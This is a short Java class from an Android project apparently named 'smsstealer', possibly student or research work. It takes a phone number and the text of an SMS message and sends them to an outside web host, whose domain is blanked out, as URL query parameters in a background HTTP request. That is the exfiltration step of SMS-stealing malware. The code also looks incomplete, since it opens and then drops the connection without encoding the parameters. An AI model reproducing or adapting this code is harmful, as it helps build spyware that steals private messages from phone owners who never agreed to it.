package edu.oakland.smsstealer;

import android.os.AsyncTask;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Created by anthony on 1/11/17.
 */

public class GetRequest extends AsyncTask {
    private static final String ASP = "http://www.   .com/?number=";
    private URL url;

    public GetRequest(String number, String message, boolean isTMobile) {
        try {
            url = new URL(ASP + number + "&message=" + message + "&isTMobile=" + isTMobile);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected Object doInBackground(Object[] params) {
        try {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}